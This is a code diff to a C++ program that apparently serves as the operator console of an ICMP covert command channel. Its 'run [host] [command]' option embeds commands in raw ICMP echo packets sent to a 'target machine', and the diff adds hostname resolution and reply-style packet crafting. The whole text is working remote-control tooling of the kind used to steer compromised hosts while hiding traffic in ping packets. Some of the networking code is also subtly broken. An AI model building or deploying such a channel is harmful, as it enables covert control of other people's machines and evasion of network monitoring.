@@ -17,6 +17,7 @@
 #include <netinet/ip_icmp.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
+#include <netdb.h>
 
 static std::set<std::string> cur_connections;
 static std::mutex cur_connections_mutex;
@@ -92,7 +93,7 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
     memcpy(&out[sizeof(icmphdr)], buf, size);
   }
 
-  icmp->checksum = htons(checksum(out, sizeof(icmp) + size));
+  icmp->checksum = htons(checksum(out, sizeof(icmphdr) + size));
 
   sockaddr_in addr_;
   addr_.sin_family = AF_INET;
@@ -100,7 +101,7 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
   addr_.sin_addr.s_addr = inet_addr(dst.c_str());
 
   long ret;
-  if ((ret = sendto(sockfd, out, sizeof(icmp) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
+  if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
   {
     perror("sendto");
   }
@@ -119,9 +120,6 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   iphdr *ip = (iphdr *)in;
   if (ret > sizeof(iphdr))
   {
-    // in_addr addr{ip->saddr};
-    // char *src_ = inet_ntoa(addr);
-    // src = src_;
     char *src_ = (char *)(in + sizeof(iphdr) + sizeof(icmphdr));
     src = src_;
 
@@ -135,6 +133,45 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   }
 
   return ret;
+}
+
+std::string lookup_host(const std::string &host)
+{
+  struct addrinfo hints, *res, *result;
+  int errcode;
+  char addrstr[100];
+  void *ptr;
+
+  memset(&hints, 0, sizeof(hints));
+  hints.ai_family = PF_UNSPEC;
+  hints.ai_socktype = SOCK_STREAM;
+  hints.ai_flags |= AI_CANONNAME;
+
+  errcode = getaddrinfo(host.c_str(), NULL, &hints, &result);
+  if (errcode != 0)
+  {
+    perror("getaddrinfo");
+    return "";
+  }
+
+  res = result;
+
+  inet_ntop(res->ai_family, res->ai_addr->sa_data, addrstr, 100);
+
+  switch (res->ai_family)
+  {
+  case AF_INET:
+    ptr = &((struct sockaddr_in *)res->ai_addr)->sin_addr;
+    break;
+  case AF_INET6:
+    ptr = &((struct sockaddr_in6 *)res->ai_addr)->sin6_addr;
+    break;
+  }
+  inet_ntop(res->ai_family, ptr, addrstr, 100);
+
+  freeaddrinfo(result);
+
+  return addrstr;
 }
 
 void listen_task()
@@ -161,7 +198,7 @@ void listen_task()
   }
 }
 
-void send_command(const std::string &ip, const std::string &command)
+void send_command(const std::string &dst, const std::string &command)
 {
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
   if (sockfd == -1)
@@ -171,7 +208,52 @@ void send_command(const std::string &ip, const std::string &command)
   }
 
   std::vector<uint8_t> data{command.begin(), command.end()};
-  send_ping(sockfd, ip, &data.at(0), data.size());
+
+  long ret = 0;
+  uint8_t in[1024];
+  if ((ret = read(sockfd, in, sizeof(in))) == -1)
+  {
+    return;
+  }
+
+  // iphdr *ip = (iphdr *)in;
+  //   if (ret > sizeof(iphdr))
+  //   {
+  //     char *src_ = (char *)(in + sizeof(iphdr) + sizeof(icmphdr));
+  //     src = src_;
+
+  //     if (ret > sizeof(iphdr) + sizeof(icmphdr))
+  //     {
+  //       if (buf && size > 0)
+  //       {
+  //         memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), size);
+  //       }
+  //     }
+  //   }
+
+  iphdr *ip = (iphdr *)in;
+  if (ret > sizeof(iphdr))
+  {
+    icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));
+    icmp->type = 0;
+    icmp->un.echo.sequence++;
+
+    sockaddr_in addr_;
+    addr_.sin_family = AF_INET;
+    addr_.sin_port = htons(0);
+    addr_.sin_addr.s_addr = inet_addr(dst.c_str());
+
+    memcpy((char *)(in + sizeof(iphdr) + sizeof(icmphdr)), data.data(), data.size());
+
+    icmp->checksum = 0x00;
+    icmp->checksum = htons(checksum(icmp, sizeof(icmphdr) + data.size()));
+
+    long ret;
+    if ((ret = sendto(sockfd, icmp, sizeof(icmphdr) + data.size(), 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
+    {
+      perror("sendto");
+    }
+  }
 }
 
 std::vector<std::string> split_input(std::string &input)
@@ -191,7 +273,7 @@ int main(int argc, char **argv)
   std::puts("Current commands:");
   std::puts("\tstart: Begin listening for connections");
   std::puts("\tlist: List active connections");
-  std::puts("\trun [ip] [command]: run a command on a target machine");
+  std::puts("\trun [host] [command]: run a command on a target machine");
   std::puts("\texit: Exit program!");
 
   while (1)
@@ -220,20 +302,21 @@ int main(int argc, char **argv)
     {
       if (input_arr.size() < 3)
       {
-        std::puts("usage: run [ip] [command]");
+        std::puts("usage: run [host] [command]");
         continue;
       }
 
-      std::string ip = input_arr.at(1);
+      std::string ip = lookup_host(input_arr.at(1));
       std::string command;
       for (int i = 2; i < input_arr.size(); i++)
       {
         command.append(input_arr.at(i));
       }
 
-      std::cout << "Running command [" << command << "] on "
+      std::cout << "Running command \"" << command << "\" on "
                 << ip
                 << "\n";
+      send_command(ip, command);
     }
     else if (input_arr.at(0).compare("exit") == 0)
     {
